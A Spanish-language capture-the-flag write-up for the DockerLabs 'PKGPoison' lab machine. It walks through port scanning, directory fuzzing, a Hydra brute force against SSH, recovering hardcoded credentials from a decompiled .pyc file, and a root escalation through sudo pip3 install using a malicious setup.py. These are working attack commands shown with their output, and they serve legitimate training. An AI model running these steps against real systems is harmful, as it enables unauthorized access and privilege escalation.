# PKGPoison - DockerLabs Writeup

## Información de la Máquina
- **Nombre:** PKGPoison
- **IP:** 172.17.0.2
- **Dificultad:** Fácil
- **Plataforma:** DockerLabs

## Objetivo
Obtener acceso completo a la máquina PKGPoison mediante técnicas de enumeración web, análisis de archivos y escalada de privilegios, culminando en acceso root.

---

## 1. Reconocimiento y Enumeración

### 1.1 Escaneo de Puertos
Comenzamos con un escaneo de puertos usando Nmap para identificar servicios disponibles:

```bash
nmap -sV -T5 172.17.0.2
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

**Servicios identificados:**
- Puerto 22: SSH (OpenSSH 8.2p1)
- Puerto 80: HTTP (Apache 2.4.41)

### 1.2 Enumeración Web
Al acceder a `http://172.17.0.2/`, encontramos una página con una imagen con nada interesante y un texto debajo que dice:

```html
<p><i>There's nothing here.</i></p>
```

La página principal no revela información útil, por lo que procedemos con enumeración de directorios.

### 1.3 Fuzzing de Directorios
Dado que no encontramos contenido visible en la página principal, utilizamos Gobuster para descubrir directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Resultado:**
```
/.        (Status: 200) [Size: 589]
/notes    (Status: 301) [Size: 308] [--> http://172.17.0.2/notes/]
```

¡Excelente! Descubrimos el directorio `/notes`.

---

## 2. Descubrimiento de Información Sensible

### 2.1 Análisis del Directorio /notes
Al acceder a `http://172.17.0.2/notes/`, encontramos un archivo llamado `note.txt` con el siguiente contenido:

```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

**Información extraída:**
- Usuario potencial: `dev`
- Contraseña sugerida: `developer123`
- Indica que estas credenciales son débiles y deben cambiarse

### 2.2 Intento de Acceso SSH
Probamos las credenciales encontradas en el servicio SSH:

```bash
ssh dev@172.17.0.2
# Password: developer123
```

**Resultado:** `Permission denied, please try again.`

Las credenciales del archivo no funcionan, confirmando que fueron cambiadas como sugería la nota.

---

## 3. Ataque de Fuerza Bruta

### 3.1 Hydra contra SSH
Dado que las credenciales del archivo no son válidas, procedemos con un ataque de fuerza bruta usando Hydra:

```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

**Resultado exitoso:**
```
[22][ssh] host: 172.17.0.2   login: dev   password: computer
```

¡Credenciales válidas encontradas!
- **Usuario:** dev
- **Contraseña:** computer

---

## 4. Acceso Inicial

### 4.1 Conexión SSH
Con las credenciales correctas, obtenemos acceso al sistema:

```bash
ssh dev@172.17.0.2
# Password: computer
```

**Mensaje de bienvenida:**
```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.11.2-amd64 x86_64)
```

✅ **Acceso exitoso como usuario `dev`**

---

## 5. Enumeración Interna

### 5.1 Reconocimiento del Sistema
Identificamos los usuarios presentes en el sistema:

```bash
cat /etc/passwd | grep -v nologin | grep -E "(root|home)"
```

**Usuarios identificados:**
- `root` (UID 0)
- `dev` (usuario actual)
- `admin` (usuario privilegiado)

### 5.2 Búsqueda de Archivos Sensibles
Realizamos una búsqueda exhaustiva de archivos que puedan contener credenciales:

```bash
find /opt /usr/local -type f -readable 2>/dev/null | xargs grep -l "admin\|password" 2>/dev/null
```

**Archivo crítico encontrado:**
```
/opt/scripts/__pycache__/secret.cpython-38.pyc
```

Este archivo compilado de Python (.pyc) podría contener información sensible.

### 5.3 Análisis del Archivo Compilado

#### 5.3.1 Descompilación
Para analizar el archivo .pyc, utilizamos uncompyle6:

```bash
uncompyle6 /opt/scripts/__pycache__/secret.cpython-38.pyc
```

**Código decompilado:**
```python
def auth():
    username = "admin"
    password = "p@$$w0r8321"
    print("Authenticating...")
```

¡Excelente! Encontramos credenciales hardcodeadas:
- **Usuario:** admin
- **Contraseña:** p@$$w0r8321

---

## 6. Escalada Horizontal (dev → admin)

### 6.1 Cambio de Usuario
Con las credenciales extraídas del archivo Python:

```bash
su admin
# Password: p@$$w0r8321
```

✅ **Acceso exitoso como usuario `admin`**

---

## 7. Análisis de Privilegios

### 7.1 Verificación de Permisos Sudo
Comprobamos qué comandos puede ejecutar admin con privilegios de root:

```bash
sudo -l
```

**Resultado:**
```
User admin may run the following commands on pkgpoison:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

🚨 **VULNERABILIDAD CRÍTICA IDENTIFICADA:**
El usuario admin puede ejecutar `pip3 install` como root sin contraseña, lo que permite ejecutar código arbitrario durante la instalación de paquetes Python.

---

## 8. Escalada de Privilegios (admin → root)

### 8.1 Búsqueda en GTFOBins
Al identificar que podemos ejecutar `pip3 install` con privilegios de root, consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/pip/) para encontrar técnicas de escalada de privilegios.

**GTFOBins - Sudo:**
> If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

El exploit recomendado es:
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

### 8.2 Ejecución del Exploit
Implementamos el exploit paso a paso:

```bash
# Crear directorio temporal
TF=$(mktemp -d)

# Crear setup.py malicioso
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py

# Ejecutar con sudo especificando el usuario root explícitamente
sudo -u root /usr/bin/pip3 install $TF
```

**¿Por qué usar `sudo -u root`?**
Aunque el comando `sudo pip3 install` funcionaría, usar `sudo -u root /usr/bin/pip3 install` es más explícito y garantiza que el comando se ejecute específicamente como el usuario root, evitando cualquier ambigüedad en la ejecución.

### 8.3 Resultado del Exploit
```bash
admin@30650cae576e:/tmp# TF=$(mktemp -d)
admin@30650cae576e:/tmp# echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
admin@30650cae576e:/tmp# sudo -u root /usr/bin/pip3 install $TF
Processing ./tmp.cEgkwJOd1g
# whoami
root
# 
```

✅ **ROOT OBTENIDO**

### 8.4 Verificación de Privilegios
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Hemos obtenido acceso completo como root de manera directa y eficiente utilizando el exploit de GTFOBins.

---
